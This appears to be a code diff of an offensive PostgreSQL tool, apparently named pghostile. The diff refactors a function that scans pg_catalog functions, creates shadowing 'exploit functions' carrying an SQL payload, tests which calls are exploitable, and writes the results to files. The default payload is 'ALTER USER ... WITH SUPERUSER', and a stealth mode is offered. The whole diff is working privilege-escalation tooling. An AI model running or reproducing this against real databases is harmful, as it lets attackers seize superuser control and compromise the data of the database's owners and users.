@@ -4,123 +4,82 @@ import sys
 import os
 import argparse
 import getpass
-import psycopg2
 from psycopg2 import Error
-from core.utils import print_ok, print_err, get_convertion_matrix, convert_types
+from core.utils import print_ok, print_err, print_warn, convert_types, get_candidate_functions
 from core.database import Database
-from core.dbfunction import DBFunction
+
+from core.dbfunction_override import DBFunctionOverride
 
 
-def make_it_hostile(db, exploit_payload, stealth_mode=False, create_exploit=True, run_tests=True, out_dir="./out", track_execution=False):
-    defined_functions = []
+def make_it_hostile(db, exploit_payload, stealth_mode, create_exploit, run_tests, out_dir, track_execution, overwrite_existing):
+    override_functions = []
+    exploitables = []
+    errors = []
+    test_log = []
 
-    try:
-        print_ok("Starting ... \n")
-        argtypes_filter = [f"{oid} = any(p.proargtypes)" for oid in get_convertion_matrix().keys()]
-        # @TODO is it ok to get only f() from pg_catalog? probably we should also incude public
-        qry = """
-            SELECT n.nspname as ns, p.proname as name, p.pronargs as nargs, p.proargtypes as argtypes, p.prorettype as rettype
-            FROM pg_catalog.pg_namespace n JOIN pg_catalog.pg_proc p ON p.pronamespace = n.oid
-            WHERE p.prokind = 'f' and p.pronargs > 0 and n.nspname = 'pg_catalog' and (
-                %s
-            )
-        """ % " or ".join(argtypes_filter)
+    print_ok("Starting ... \n")
+    c_functions = get_candidate_functions(db)
+    print("[ * ] %s interesting functions have been identified" % len(c_functions))
+    for df in c_functions:
+        conv_types = convert_types(df.params_type)
+        for artype in conv_types:
+            dff = DBFunctionOverride(df, artype, exploit_payload, stealth_mode, track_execution)
+            if dff not in override_functions:
+                override_functions.append(dff)
+    if not overwrite_existing:
+        print("[ * ] Checking if functions already exist")
+        for df in override_functions:
+            if df.exists():
+                print_err(f"Test function {dff} is already defined! Stopping")
+                return
 
-        found_functions_cnt = 0
-        res = db.query(qry)
-        for record in res.fetchall():
-            found_functions_cnt += 1
-            initial_types = [int(i) for i in record['argtypes'].split()]
-            conv_types = convert_types(initial_types)
-            for artype in conv_types:
-                df = DBFunction(record['name'], artype, initial_types, record['rettype'], exploit_payload, stealth_mode, track_execution)
-                if df not in defined_functions:
-                    defined_functions.append(df)
-        print("[ * ] %s interesting functions have been identified" % found_functions_cnt)
-        errors = []
-        if len(defined_functions) > 0:
-            if run_tests:
-                print("[ * ] Creating test functions")
-                for df in defined_functions:
-                    try:
-                        # print("Attempting to create %s" % df)
-                        db.query(df.create_query_test)
-                        df.created = True
-                    except psycopg2.errors.DuplicateFunction:
-                        print_err(f"Test function {df} is already defined! Stopping")
-                        db.close()
-                        return
-                    except Exception as e:
-                        df.created = False
-                        errors.append(f"Exception creating test function {df} {e}")
-                        pass
+    if run_tests:
+        print("[ * ] Testing functions")
+        for df in override_functions:
+            try:
+                if df.run_test():
+                    exploitables.append(df)
+            except Exception as e:
+                test_log.append(f"Exception testing function {df} {e}")
+                pass
+        with open(os.path.join(out_dir, "exploitables.sql"), "w") as f:
+            f.write(";\n".join([f.test_query for f in exploitables]))
+        if len(exploitables) > 0:
+            print("[ * ] %s exploitable function calls have been tested" % len(exploitables))
+        else:
+            print_err("No exploitable functions found during test")
+            return
 
-                print("[ * ] Testing functions")
-                for df in defined_functions:
-                    if not df.created:
-                        continue
-                    try:
-                        # print("Testing %s" % df.test_query)
-                        db.query("drop function if exists public.___pghostile_test_wrapper()")
-                        db.query(df.test_query)
-                        db.query("select public.___pghostile_test_wrapper()")
-                        db.query("drop function public.___pghostile_test_wrapper()")
-                        df.test_ok = True
-                    except Exception:
-                        pass
-                print("[ * ] Deleting test functions")
-                for df in defined_functions:
-                    if not df.created:
-                        continue
-                    try:
-                        db.query(df.drop_query)
-                        # print(df.drop_query)
-                    except Exception as e:
-                        errors.append(f"Exception deleting test function {df} {e}")
+    if create_exploit:
+        print("[ * ] Creating exploit functions")
+        created_functions = []
+        if run_tests:
+            for df in exploitables:
+                df.create_exploit_function()
+                created_functions.append(df)
+        else:
+            for df in override_functions:
+                try:
+                    df.create_exploit_function()
+                    created_functions.append(df)
+                except Exception as e:
+                    errors.append(f"Exception creating exploit function {df} {e}")
 
-            if create_exploit:
-                print("[ * ] Creating exploit functions")
-                for df in defined_functions:
-                    try:
-                        # print("Attempting to create %s" % df)
-                        db.query(df.create_query_exploit)
-                        df.created = True
-                    except psycopg2.errors.DuplicateFunction:
-                        print_err(f"Exploit function {df} is already defined! Stopping")
-                        db.close()
-                        return
-                    except Exception as e:
-                        df.created = False
-                        errors.append(f"Exception creating exploit function {df} {e}")
+        print("[ * ] Done!")
+        with open(os.path.join(out_dir, "drop_functions.sql"), "w") as f:
+            f.write(";\n".join([f.drop_query for f in created_functions]))
 
-            created_functions = {df.name for df in defined_functions if df.created}
-            print("[ * ] Done! %s functions have been created\n" % len(created_functions))
-            if create_exploit:
-                with open(os.path.join(out_dir, "drop_functions.sql"), "w") as f:
-                    for df in defined_functions:
-                        if df.created:
-                            f.write(f"{df.drop_query};\n")
+    print_ok("\n%d functions have been created" % len(created_functions))
 
-            with open(os.path.join(out_dir, "exploitables.sql"), "w") as f:
-                if run_tests:
-                    exploitables = []
-                    for df in defined_functions:
-                        if df.test_ok and df.test_query not in exploitables:
-                            f.write(f"{df.test_query};\n")
-                            exploitables.append(df.test_query)
-                    print_ok("%s exploitable function calls have been tested!" % len(exploitables))
-                else:
-                    f.write("You need to run the tests to generate this file")
-            print_ok(f"The '{out_dir}' folder contains the output")
+    if len(errors) > 0:
+        print_warn("There were some errors creating functions. See errors.txt for details")
+    with open(os.path.join(out_dir, "errors.txt"), "w") as f:
+        f.write("\n".join(errors))
 
-        with open(os.path.join(out_dir, "errors.txt"), "w") as f:
-            for err in errors:
-                f.write(f"{err};\n")
+    with open(os.path.join(out_dir, "test_log.txt"), "w") as f:
+        f.write("\n".join(test_log))
 
-    except (Exception, Error) as error:
-        raise  # @TODO
-    finally:
-        db.close()
+    print_ok(f"The '{out_dir}' folder contains the output")
 
 
 def main():
@@ -137,6 +96,7 @@ def main():
     parser.add_argument("-S", '--db-ssl-mode', type=str, help='Database ssl mode (default None)')
     parser.add_argument("-x", '--exploit-payload', type=str, help='The SQL commands')
     parser.add_argument("-t", "--track-execution", default=False, action='store_true', help='Track the exploit function execution')
+    parser.add_argument("-O", "--no-overwrite", default=False, action='store_true', help='Stop execution if at least one exploit function already exists')
     args = parser.parse_args()
 
     if not os.path.isdir(args.out):
@@ -182,15 +142,27 @@ def main():
 
     exploit_payload = args.exploit_payload or f"ALTER USER {args.db_username} WITH SUPERUSER;"
 
-    make_it_hostile(
-        db,
-        exploit_payload,
-        stealth_mode=not args.disable_stealth_mode,
-        create_exploit=not args.disable_exploits_creation,
-        run_tests=not args.skip_tests,
-        out_dir=args.out,
-        track_execution=args.track_execution
-    )
+    try:
+        make_it_hostile(
+            db,
+            exploit_payload,
+            stealth_mode=not args.disable_stealth_mode,
+            create_exploit=not args.disable_exploits_creation,
+            run_tests=not args.skip_tests,
+            out_dir=args.out,
+            track_execution=args.track_execution,
+            overwrite_existing=not args.no_overwrite
+        )
+    except KeyboardInterrupt:
+        print("Exit requested by the user")
+    except Error as dberr:
+        print_err("Database error %s" % dberr)
+    except Exception:
+        print_err("Unhandled exception")
+        raise
+    finally:
+        db.close()
+        # print("Exiting")
 
     return 0
 
